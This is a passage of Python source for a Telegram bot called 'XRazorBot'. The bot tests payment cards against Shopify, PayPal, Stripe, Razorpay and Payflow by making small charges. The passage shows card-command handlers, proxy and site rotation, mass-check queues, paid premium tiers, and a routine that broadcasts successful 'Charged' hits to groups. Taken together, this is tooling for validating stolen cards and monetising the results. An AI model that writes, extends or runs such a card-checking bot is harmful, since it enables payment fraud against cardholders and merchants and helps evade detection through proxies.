👑 <b>𝐔𝐬𝐞𝐫</b> ↬ <a href="tg://user?id={user_info['id']}">{first_name}</a> <b>{plan_badge}</b>
⭐ <b>𝐇𝐢𝐭 𝐅𝐫𝐨𝐦</b> ↬ XRazorBot"""

    buttons = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("Channel 🌐", url="https://t.me/+QuZALtRVK0QyMzFk"),
            InlineKeyboardButton("Owner 👤", url="https://t.me/ArxisX")
        ]
    ])

    for gid in groups:
        try:
            await bot.send_message(gid, premium_emoji(msg), parse_mode='html', reply_markup=buttons)
        except:
            pass

async def format_single_result(gateway, result, start_time, username, is_free, user_id=None):
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'][:6])
    elapsed = time.time() - start_time
    plan_badge = get_plan_badge({'id': user_id}) if user_id else ("Free 🤡" if is_free else "Pro 💎")
    gateway_labels = {
        'stripe_auth':     'StripeAuth',
        'stripe_donation': 'StripeDonate',
        'paypal':          'PayPal',
        'paypal2':         'PayPal2',
        'razorpay':        'Razorpay',
        'stripe5':         'Stripe5',
        'braintree':       'Braintree',
        'payflow':         'Payflow',
    }
    label = gateway_labels.get(gateway, 'Shopify')
    try:
        sender = await bot.get_entity(user_id)
        display_name = sender.first_name or username or "User"
    except:
        display_name = username or "User"
    return premium_emoji(_build_result_msg(label, result, elapsed, display_name, plan_badge, brand, bin_type, level, bank, country, flag))

print("✅ Part 1 loaded: all configs, checkers, and UI helpers ready.")
# ================== BOT INITIALIZATION ==================
bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions = {}
pending_checks = {}
pending_mass = {}           # Shopify & Stripe Auth mass
pending_cc = {}             # Shopify single
pending_rz = {}             # Razorpay single
pending_st5 = {}            # Stripe $5 single
pending_bt = {}             # Braintree single
pending_paypal_mass = {}    # PayPal $1 mass
pending_payflow_mass = {}   # Payflow $18 mass
pending_razorpay_mass = {}  # Razorpay mass
pending_stripe5_mass = {}   # Stripe $5 mass

# ---------- Helper for proxy dict ----------
def proxy_str_to_dict(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.split(':')
    if len(parts) == 2:
        return {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
    elif len(parts) == 4:
        user_pass = f"{parts[2]}:{parts[3]}"
        proxy_url = f"http://{user_pass}@{parts[0]}:{parts[1]}"
        return {"http": proxy_url, "https": proxy_url}
    return None

# ========== START COMMAND ==========
def _start_msg(first_name):
    return (
        f"<b>𝗪𝗲𝗹𝗰𝗼𝗺𝗲 {first_name} » ⚡</b>\n\n"
        "This bot promises you fast and safe checkups with different gateways! ✨\n\n"
        "<b>朱 𝘽𝙤𝙩 𝘿𝙚𝙫 ↬ ༒ Aʀxɪs༒</b>\n\n"
        "<b>𝙑𝙚𝙧𝙨𝙞𝙤𝙣 ↬ 2.0 💎</b> <i>( Constantly Upgrading... )</i>"
    )

def _start_buttons(is_owner=False):
    if is_owner:
        return [
            [Button.inline("👑 𝗚𝗮𝘁𝗲𝘀 ⚡", b"start_gates"), Button.inline("💎 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 🧿", b"start_account")],
            [Button.inline("⚡ 𝗣𝗼𝘄𝗲𝗿𝘀 🎭", b"owner_powers"), Button.inline("🛠️ 𝗧𝗼𝗼𝗹𝘀 ⚡", b"start_tools")],
            [Button.inline("⚠️ 𝗖𝗹𝗼𝘀𝗲", b"start_close")],
        ]
    return [
        [Button.inline("👑 𝗚𝗮𝘁𝗲𝘀 ⚡", b"start_gates"), Button.inline("💎 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 🧿", b"start_account")],
        [Button.inline("🛠️ 𝗧𝗼𝗼𝗹𝘀 ⚡", b"start_tools")],
        [Button.inline("⚠️ 𝗖𝗹𝗼𝘀𝗲", b"start_close")],
    ]

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    add_user_for_broadcast(user_id)
    sender = await event.get_sender()
    first_name = (sender.first_name or "User") if sender else "User"
    await event.reply(premium_emoji(_start_msg(first_name)), buttons=_start_buttons(user_id == OWNER_ID), parse_mode='html')

@bot.on(events.NewMessage(pattern='/cmds'))
async def cmds(event):
    user_id = event.sender_id
    sender = await event.get_sender()
    first_name = (sender.first_name or "User") if sender else "User"
    await event.reply(premium_emoji(_start_msg(first_name)), buttons=_start_buttons(user_id == OWNER_ID), parse_mode='html')

@bot.on(events.CallbackQuery(data=b"start_back"))
async def cb_start_back(event):
    sender = await event.get_sender()
    first_name = (sender.first_name or "User") if sender else "User"
    await event.edit(premium_emoji(_start_msg(first_name)), buttons=_start_buttons(event.sender_id == OWNER_ID), parse_mode='html')

@bot.on(events.CallbackQuery(data=b"owner_powers"))
async def cb_owner_powers(event):
    if event.sender_id != OWNER_ID:
        await event.answer("⛔ Access Denied", alert=True)
        return
    msg = (
        "<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
        "<b>      ⚡ 𝗢𝗪𝗡𝗘𝗥 𝗣𝗢𝗪𝗘𝗥𝗦 🎭</b>\n"
        "<b>━━━━━━━━━━━━━━━━━━━━</b>\n\n"
        "👑 <b>𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁</b>\n"
        "┣ <code>/gen [qty] [days]</code>\n"
        "┣ <code>/addpremium &lt;id&gt; &lt;days&gt;</code>\n"
        "┣ <code>/removepremium &lt;id&gt;</code>\n"
        "┣ <code>/codes</code>\n"
        "┗ <code>/delcode CODE</code>\n\n"
        "🔨 <b>𝗨𝘀𝗲𝗿 𝗖𝗼𝗻𝘁𝗿𝗼𝗹</b>\n"
        "┣ <code>/ban &lt;id&gt;</code>\n"
        "┣ <code>/unban &lt;id&gt;</code>\n"
        "┗ <code>/banlist</code>\n\n"
        "⚙️ <b>𝗕𝗼𝘁 𝗖𝗼𝗻𝗳𝗶𝗴</b>\n"
        "┣ <code>/grp add/rm/list</code>\n"
        "┣ <code>/gate &lt;gw&gt; on/off/mass</code>\n"
        "┣ <code>/api list/add/rm</code>\n"
        "┗ <code>/broadcast</code>\n\n"
        "<b>━━━━━━━━━━━━━━━━━━━━</b>"
    )
    await event.edit(premium_emoji(msg), buttons=[[Button.inline("⬅️ 𝗕𝗮𝗰𝗸 𝘁𝗼 𝗠𝗲𝗻𝘂", b"start_back")]], parse_mode='html')

@bot.on(events.CallbackQuery(data=b"start_tools"))
async def cb_start_tools(event):
    msg = (
        "<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
        "<b>        🛠️ 𝗧𝗢𝗢𝗟𝗦 ⚡</b>\n"
        "<b>━━━━━━━━━━━━━━━━━━━━</b>\n\n"
        "📋 <b>𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀</b>\n"
        "┣ <code>/id</code>  ➜  𝗬𝗼𝘂𝗿 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 𝗜𝗗\n"
        "┣ <code>/fuck</code>  ➜  Remove Dead Sites\n"
        "┣ <code>/proxy</code>  ➜  Delete Dead Proxies\n"
        "┣ <code>/tas</code>  ➜  Add Shopify Sites From .txt\n"
        "┣ <code>/addsite &lt;url&gt;</code>  ➜  Add Shopify Site\n"
        "┣ <code>/tap</code>  ➜  Add Proxies From .txt\n"
        "┣ <code>/addproxy &lt;proxy&gt;</code>  ➜  Add Proxy\n"
        "┣ <code>/f &lt;msg&gt;</code>  ➜  Send Feedback To Owner\n"
        "┣ <code>/bin &lt;card/bin&gt;</code>  ➜  BIN Lookup\n"
        "┗ <code>/redeem &lt;code&gt;</code>  ➜  𝗥𝗲𝗱𝗲𝗲𝗺 𝗸𝗲𝘆\n\n"
        "<b>━━━━━━━━━━━━━━━━━━━━</b>"
    )
    await event.edit(premium_emoji(msg), buttons=[[Button.inline("⬅️ 𝗕𝗮𝗰𝗸 𝘁𝗼 𝗠𝗲𝗻𝘂", b"start_back")]], parse_mode='html')

@bot.on(events.CallbackQuery(data=b"start_close"))
async def cb_start_close(event):
    chat_id = event.chat_id
    msg_id  = event.message_id
    await event.answer()
    try:
        await bot.send_message(
            chat_id,
            premium_emoji("✨ <b>Thanks For Using #XRazorBot</b> 👋"),
            reply_to=msg_id,
            parse_mode='html'
        )
    except:
        pass
    try:
        await event.delete()
    except:
        pass

@bot.on(events.CallbackQuery(data=b"start_account"))
async def cb_start_account(event):
    user_id = event.sender_id
    sender = await event.get_sender()
    first_name = (sender.first_name or "User") if sender else "User"
    prem_data = load_premium_users()
    if user_id == OWNER_ID:
        plan      = "Owner 🎭"
        mass_lim  = str(MAX_CARDS)
        priv      = "✅ On"
        expires   = "∞ Lifetime"
    elif str(user_id) in prem_data:
        plan      = "Pro 💎"
        mass_lim  = str(MAX_CARDS)
        priv      = "✅ On"
        expires   = datetime.fromtimestamp(prem_data[str(user_id)]).strftime('%Y-%m-%d')
    else:
        plan      = "Free 🤡"
        mass_lim  = str(FREE_GROUP_MAX_CARDS)
        priv      = "❌ Off"
        expires   = "N/A"
    msg = (
        f"<b>User Info ~ XRazorBot ✦</b>\n"
        "<b>━━━━━━━━━━━━━━━</b>\n"
        f"<b>[•] Name:</b> {first_name}\n"
        f"<b>[•] ID:</b> <code>{user_id}</code>\n"
        f"<b>[•] Plan:</b> {plan}\n"
        f"<b>[•] Mass Limit:</b> {mass_lim}\n"
        f"<b>[•] Private Access:</b> {priv}\n"
        f"<b>[•] Plan Expires:</b> {expires}\n"
        "<b>━━━━━━━━━━━━━━━</b>"
    )
    await event.edit(premium_emoji(msg), buttons=[[Button.inline("⬅️ 𝗕𝗮𝗰𝗸 𝘁𝗼 𝗠𝗲𝗻𝘂", b"start_back")]], parse_mode='html')

@bot.on(events.CallbackQuery(data=b"start_gates"))
async def cb_start_gates(event):
    msg = (
        "<b>𝗚𝗮𝘁𝗲𝘀 ⚡</b>\n"
        "<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
        "┣ <b>𝗧𝗼𝘁𝗮𝗹 𝗚𝗮𝘁𝗲𝘀 ➜ 8 ⚡</b>\n"
        "┣ <b>𝘼𝙪𝙩𝙝 𝗚𝗮𝘁𝗲𝘀 ➜ 1 🔥</b>\n"
        "┣ <b>𝘾𝙝𝙖𝙧𝙜𝙚𝙙 𝗚𝗮𝘁𝗲𝘀 ➜ 7 💎</b>\n"
        "┗ <b>𝗖𝗵𝗼𝗼𝘀𝗲 𝗴𝗮𝘁𝗲 𝘁𝘆𝗽𝗲 𝗯𝗲𝗹𝗼𝘄.</b>"
    )
    buttons = [
        [Button.inline("🔥 𝗔𝘂𝘁𝗵 ⚡", b"gates_auth"), Button.inline("💎 𝗖𝗵𝗮𝗿𝗴𝗲 ✨", b"gates_charge")],
        [Button.inline("⬅️ 𝗕𝗮𝗰𝗸", b"start_back")],
    ]
    await event.edit(premium_emoji(msg), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"gates_auth"))
async def cb_gates_auth(event):
    gs = load_gateway_settings()
    sa = gs.get('stripe_auth', {})
    on_txt  = "𝙊𝙉 ✅" if sa.get('enabled', True) else "𝙊𝙁𝙁 ❌"
    mass_txt = "𝙊𝙉 ✅" if sa.get('mass', True) else "𝙊𝙁𝙁 ❌"
    msg = (
        "<b>𝗚𝗮𝘁𝗲𝘀 » 𝘼𝙪𝙩𝙝 ⚡</b>\n"
        "<b>━━━━━━━━━━━━━━━━━━━━</b>\n\n"
        f"<b>𝟭 » 𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝 ➜ {on_txt}</b>\n"
        "┣ /au CC|MM|YY|CVC\n"
        f"┗ /tau ➜ 𝙈𝙖𝙨𝙨 𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝 ➜ {mass_txt}"
    )
    await event.edit(premium_emoji(msg), buttons=[[Button.inline("⬅️ 𝗕𝗮𝗰𝗸 𝘁𝗼 𝗚𝗮𝘁𝗲𝘀", b"start_gates")]], parse_mode='html')

@bot.on(events.CallbackQuery(data=b"gates_charge"))
async def cb_gates_charge(event):
    gs = load_gateway_settings()
    def gst(key):
        return "𝙊𝙉 ✅" if gs.get(key, {}).get('enabled', True) else "𝙊𝙁𝙁 ❌"
    def mst(key):
        return "𝙊𝙉 ✅" if gs.get(key, {}).get('mass', True) else "𝙊𝙁𝙁 ❌"
    msg = (
        "<b>𝗚𝗮𝘁𝗲𝘀 » 𝘾𝙝𝙖𝙧𝙜𝙚 ⚡</b>\n"
        "<b>━━━━━━━━━━━━━━━━━━━━</b>\n\n"
        f"<b>𝟭 » Shopify ➜ {gst('shopify')}</b>\n"
        "┣ /cc CC|MM|YYYY|CVC\n"
        f"┗ /chk ➜ AutoShopify ➜ {mst('shopify')}\n\n"
        f"<b>𝟮 » PayPal $1 ➜ {gst('paypal')}</b>\n"
        "┣ /pp CC|MM|YY|CVC\n\n"
        f"<b>𝟯 » PayPal $0.01 ➜ {gst('paypal2')}</b>\n"
        "┣ /pp2 CC|MM|YY|CVC\n\n"
        f"<b>𝟰 » Stripe $5 ➜ {gst('stripe5')}</b>\n"
        "┣ /st CC|MM|YY|CVC\n\n"
        f"<b>𝟱 » Razorpay ➜ {gst('razorpay')}</b>\n"
        "┣ /rz CC|MM|YYYY|CVC\n"
        f"┗ /trz ➜ Mass Razorpay ➜ {mst('razorpay')}\n\n"
        f"<b>𝟲 » Payflow $18 ➜ {gst('payflow')}</b>\n"
        "┣ /pf CC|MM|YY|CVC\n"
        f"┗ /tpf ➜ Mass Payflow ➜ {mst('payflow')}\n\n"
        f"<b>𝟳 » Stripe $1 ➜ {gst('stripe_donation')}</b>\n"
        "┣ /sd CC|MM|YY|CVC"
    )
    await event.edit(premium_emoji(msg), buttons=[[Button.inline("⬅️ 𝗕𝗮𝗰𝗸 𝘁𝗼 𝗚𝗮𝘁𝗲𝘀", b"start_gates")]], parse_mode='html')

# ========== SINGLE CHECK COMMANDS ==========
# Shopify /cc
@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc_check(event):
    user_id = event.sender_id
    add_user_for_broadcast(user_id)
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        card = extract_cc_from_text(reply.raw_text)
        if not card:
            await event.reply(premium_emoji("❌ No valid CC found in replied message."), parse_mode='html')
            return
    else:
        args = event.message.text.split(maxsplit=1)
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/cc CC|MM|YY|CVV</code> or reply to a message"), parse_mode='html')
            return
        card = extract_cc_from_text(args[1])
        if not card:
            await event.reply(premium_emoji("❌ Invalid CC format."), parse_mode='html')
            return
    pending_cc[user_id] = {'card': card}
    buttons = [[Button.inline("🌐 Use Proxy", f"cc_proxy_{user_id}"), Button.inline("⚡ No Proxy", f"cc_noproxy_{user_id}")]]
    await event.reply(premium_emoji("🛒 <b>Shopify Check</b>\n\nChoose option:"), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"cc_proxy_(\\d+)"))
async def cc_use_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    data = pending_cc.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    card = data['card']
    sites = load_sites()
    proxies = load_proxies()
    if not sites or not proxies:
        await event.answer("❌ No sites or proxies available", alert=True)
        return
    site = random.choice(sites)
    proxy = random.choice(proxies)
    start_time = time.time()
    status_msg = await event.reply(premium_emoji("🔄 Checking Shopify with proxy..."), parse_mode='html')
    try:
        result = await check_card_shopify(card, site, proxy, use_proxy_api=True)
        sender = await event.get_sender()
        user_info = {'id': user_id, 'username': sender.username or "", 'first_name': sender.first_name or "User"}
        formatted = await format_single_result('shopify', result, start_time, sender.username, not is_premium(user_id), user_id=user_id)
        await status_msg.edit(premium_emoji(formatted), parse_mode='html')
        if result['status'] == 'Charged':
            await broadcast_charged_hit(result, user_info)
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        await event.answer()

@bot.on(events.CallbackQuery(pattern=b"cc_noproxy_(\\d+)"))
async def cc_no_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    data = pending_cc.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    card = data['card']
    start_time = time.time()
    status_msg = await event.reply(premium_emoji("🔄 Checking Shopify (proxyless)..."), parse_mode='html')
    try:
        result = await check_card_shopify(card, None, None, use_proxy_api=False, use_random_sites=True)
        sender = await event.get_sender()
        user_info = {'id': user_id, 'username': sender.username or "", 'first_name': sender.first_name or "User"}
        formatted = await format_single_result('shopify', result, start_time, sender.username, not is_premium(user_id), user_id=user_id)
        await status_msg.edit(premium_emoji(formatted), parse_mode='html')
        if result['status'] == 'Charged':
            await broadcast_charged_hit(result, user_info)
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        await event.answer()

# PayPal $1 /pp
@bot.on(events.NewMessage(pattern=r'^/pp\s+'))
async def paypal_single(event):
    user_id = event.sender_id
    add_user_for_broadcast(user_id)
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        card = extract_cc_from_text(reply.raw_text)
        if not card:
            await event.reply(premium_emoji("❌ No CC found."), parse_mode='html')
            return
    else:
        args = event.message.text.split(maxsplit=1)
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/pp CC|MM|YY|CVV</code>"), parse_mode='html')
            return
        card = extract_cc_from_text(args[1])
        if not card:
            await event.reply(premium_emoji("❌ Invalid CC."), parse_mode='html')
            return
    pending_checks[user_id] = {'gateway': 'paypal', 'card': card}
    buttons = [[Button.inline("🌐 Use Proxy", f"pp_proxy_{user_id}"), Button.inline("⚡ No Proxy", f"pp_noproxy_{user_id}")]]
    await event.reply(premium_emoji("💸 <b>PayPal $1 Check</b>\n\nChoose option:"), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"pp_proxy_(\\d+)"))
async def pp_use_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    data = pending_checks.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    card = data['card']
    proxies = load_proxies()
    if not proxies:
        await event.answer("❌ No proxies available", alert=True)
        return
    proxy_str = random.choice(proxies)
    proxy_dict = proxy_str_to_dict(proxy_str)
    start_time = time.time()
    status_msg = await event.reply(premium_emoji("🔄 Checking PayPal $1 with proxy..."), parse_mode='html')
    try:
        result = await check_paypal_card(card, proxy=proxy_dict)
        sender = await event.get_sender()
        user_info = {'id': user_id, 'username': sender.username or "", 'first_name': sender.first_name or "User"}
        formatted = await format_single_result('paypal', result, start_time, sender.username, not is_premium(user_id), user_id=user_id)
        await status_msg.edit(premium_emoji(formatted), parse_mode='html')
        if result['status'] == 'CHARGED':
            await broadcast_charged_hit(result, user_info)
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        await event.answer()

@bot.on(events.CallbackQuery(pattern=b"pp_noproxy_(\\d+)"))
async def pp_no_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    data = pending_checks.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    card = data['card']
    start_time = time.time()
    status_msg = await event.reply(premium_emoji("🔄 Checking PayPal $1 (no proxy)..."), parse_mode='html')
    try:
        result = await check_paypal_card(card, proxy=None)
        sender = await event.get_sender()
        user_info = {'id': user_id, 'username': sender.username or "", 'first_name': sender.first_name or "User"}
        formatted = await format_single_result('paypal', result, start_time, sender.username, not is_premium(user_id), user_id=user_id)
        await status_msg.edit(premium_emoji(formatted), parse_mode='html')
        if result['status'] == 'CHARGED':
            await broadcast_charged_hit(result, user_info)
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        await event.answer()

# PayPal2 /pp2
@bot.on(events.NewMessage(pattern=r'^/pp2\s+'))
async def paypal2_single(event):
    user_id = event.sender_id
    add_user_for_broadcast(user_id)
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        card = extract_cc_from_text(reply.raw_text)
        if not card:
            await event.reply(premium_emoji("❌ No CC found."), parse_mode='html')
            return
    else:
        args = event.message.text.split(maxsplit=1)
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/pp2 CC|MM|YY|CVV</code>"), parse_mode='html')
            return
        card = extract_cc_from_text(args[1])
        if not card:
            await event.reply(premium_emoji("❌ Invalid CC."), parse_mode='html')
            return
    pending_cc[user_id] = {'card': card, 'gateway': 'paypal2'}
    buttons = [[Button.inline("🌐 Use Proxy", f"pp2_proxy_{user_id}"), Button.inline("⚡ No Proxy", f"pp2_noproxy_{user_id}")]]
    await event.reply(premium_emoji("🛒 <b>PayPal2 Check</b>\n\nChoose option:"), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"pp2_proxy_(\\d+)"))
async def pp2_use_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    data = pending_cc.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    card = data['card']
    proxies = load_proxies()
    if not proxies:
        await event.answer("❌ No proxies available", alert=True)
        return
    proxy = random.choice(proxies)
    start_time = time.time()
    status_msg = await event.reply(premium_emoji("🔄 Checking PayPal2 with proxy..."), parse_mode='html')
    try:
        proxy_dict = {"all://": proxy}
        result = await check_paypal2_card(card, proxy=proxy_dict)
        sender = await event.get_sender()
        user_info = {'id': user_id, 'username': sender.username or "", 'first_name': sender.first_name or "User"}
        formatted = await format_single_result('paypal2', result, start_time, sender.username, not is_premium(user_id), user_id=user_id)
        await status_msg.edit(premium_emoji(formatted), parse_mode='html')
        if result['status'] == 'CHARGED':
            await broadcast_charged_hit(result, user_info)
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        await event.answer()

@bot.on(events.CallbackQuery(pattern=b"pp2_noproxy_(\\d+)"))
async def pp2_no_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    data = pending_cc.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    card = data['card']
    start_time = time.time()
    status_msg = await event.reply(premium_emoji("🔄 Checking PayPal2 (no proxy)..."), parse_mode='html')
    try:
        result = await check_paypal2_card(card, proxy=None)
        sender = await event.get_sender()
        user_info = {'id': user_id, 'username': sender.username or "", 'first_name': sender.first_name or "User"}
        formatted = await format_single_result('paypal2', result, start_time, sender.username, not is_premium(user_id), user_id=user_id)
        await status_msg.edit(premium_emoji(formatted), parse_mode='html')
        if result['status'] == 'CHARGED':
            await broadcast_charged_hit(result, user_info)
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        await event.answer()

# Stripe Auth /au
@bot.on(events.NewMessage(pattern=r'^/au\s+'))
async def stripe_auth_single(event):
    user_id = event.sender_id
    add_user_for_broadcast(user_id)
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        card = extract_cc_from_text(reply.raw_text)
        if not card:
            await event.reply(premium_emoji("❌ No CC found."), parse_mode='html')
            return
    else:
        args = event.message.text.split(maxsplit=1)
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/au CC|MM|YY|CVV</code>"), parse_mode='html')
            return
        card = extract_cc_from_text(args[1])
        if not card:
            await event.reply(premium_emoji("❌ Invalid CC."), parse_mode='html')
            return
    start_time = time.time()
    status_msg = await event.reply(premium_emoji("🔄 Checking Stripe Auth..."), parse_mode='html')
    try:
        result = await check_stripe_auth_card(card)
        sender = await event.get_sender()
        user_info = {'id': user_id, 'username': sender.username or "", 'first_name': sender.first_name or "User"}
        formatted = await format_single_result('stripe_auth', result, start_time, sender.username, not is_premium(user_id), user_id=user_id)
        await status_msg.edit(premium_emoji(formatted), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

# Stripe Donation /sd
@bot.on(events.NewMessage(pattern=r'^/sd\s+'))
async def stripe_donation_single(event):
    user_id = event.sender_id
    add_user_for_broadcast(user_id)
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        card = extract_cc_from_text(reply.raw_text)
        if not card:
            await event.reply(premium_emoji("❌ No CC found."), parse_mode='html')
            return
    else:
        args = event.message.text.split(maxsplit=1)
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/sd CC|MM|YY|CVV</code>"), parse_mode='html')
            return
        card = extract_cc_from_text(args[1])
        if not card:
            await event.reply(premium_emoji("❌ Invalid CC."), parse_mode='html')
            return
    start_time = time.time()
    status_msg = await event.reply(premium_emoji("💸 Processing Stripe Donation ($1.00)..."), parse_mode='html')
    try:
        result = await check_stripe_donation_card(card)
        sender = await event.get_sender()
        user_info = {'id': user_id, 'username': sender.username or "", 'first_name': sender.first_name or "User"}
        formatted = await format_single_result('stripe_donation', result, start_time, sender.username, not is_premium(user_id), user_id=user_id)
        await status_msg.edit(premium_emoji(formatted), parse_mode='html')
        if result['status'] == 'CHARGED':
            await broadcast_charged_hit(result, user_info)
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

# Razorpay /rz
@bot.on(events.NewMessage(pattern=r'^/rz\s+'))
async def razorpay_single(event):
    user_id = event.sender_id
    add_user_for_broadcast(user_id)
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        card = extract_cc_from_text(reply.raw_text)
        if not card:
            await event.reply(premium_emoji("❌ No CC found."), parse_mode='html')
            return
    else:
        args = event.message.text.split(maxsplit=1)
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/rz CC|MM|YY|CVV</code>"), parse_mode='html')
            return
        card = extract_cc_from_text(args[1])
        if not card:
            await event.reply(premium_emoji("❌ Invalid CC."), parse_mode='html')
            return
    pending_rz[user_id] = {'card': card}
    buttons = [[Button.inline("🌐 Use Proxy", f"rz_proxy_{user_id}"), Button.inline("⚡ No Proxy", f"rz_noproxy_{user_id}")]]
    await event.reply(premium_emoji("🛒 <b>Razorpay Check</b>\n\nChoose option:"), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"rz_proxy_(\\d+)"))
async def rz_use_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    data = pending_rz.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    card = data['card']
    proxies = load_proxies()
    if not proxies:
        await event.answer("❌ No proxies available", alert=True)
        return
    proxy = random.choice(proxies)
    start_time = time.time()
    status_msg = await event.reply(premium_emoji("🔄 Checking Razorpay with proxy..."), parse_mode='html')
    try:
        result = await check_razorpay_card(card, proxy=proxy)
        sender = await event.get_sender()
        user_info = {'id': user_id, 'username': sender.username or "", 'first_name': sender.first_name or "User"}
        formatted = await format_single_result('razorpay', result, start_time, sender.username, not is_premium(user_id), user_id=user_id)
        await status_msg.edit(premium_emoji(formatted), parse_mode='html')
        if result['status'] == 'CHARGED':
            await broadcast_charged_hit(result, user_info)
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        await event.answer()

@bot.on(events.CallbackQuery(pattern=b"rz_noproxy_(\\d+)"))
async def rz_no_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    data = pending_rz.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    card = data['card']
    start_time = time.time()
    status_msg = await event.reply(premium_emoji("🔄 Checking Razorpay (no proxy)..."), parse_mode='html')
    try:
        result = await check_razorpay_card(card, proxy=None)
        sender = await event.get_sender()
        user_info = {'id': user_id, 'username': sender.username or "", 'first_name': sender.first_name or "User"}
        formatted = await format_single_result('razorpay', result, start_time, sender.username, not is_premium(user_id), user_id=user_id)
        await status_msg.edit(premium_emoji(formatted), parse_mode='html')
        if result['status'] == 'CHARGED':
            await broadcast_charged_hit(result, user_info)
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        await event.answer()

# Stripe $5 /st
@bot.on(events.NewMessage(pattern=r'^/st\s+'))
async def stripe5_single(event):
    user_id = event.sender_id
    add_user_for_broadcast(user_id)
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        card = extract_cc_from_text(reply.raw_text)
        if not card:
            await event.reply(premium_emoji("❌ No CC found."), parse_mode='html')
            return
    else:
        args = event.message.text.split(maxsplit=1)
        if len(args) < 2:
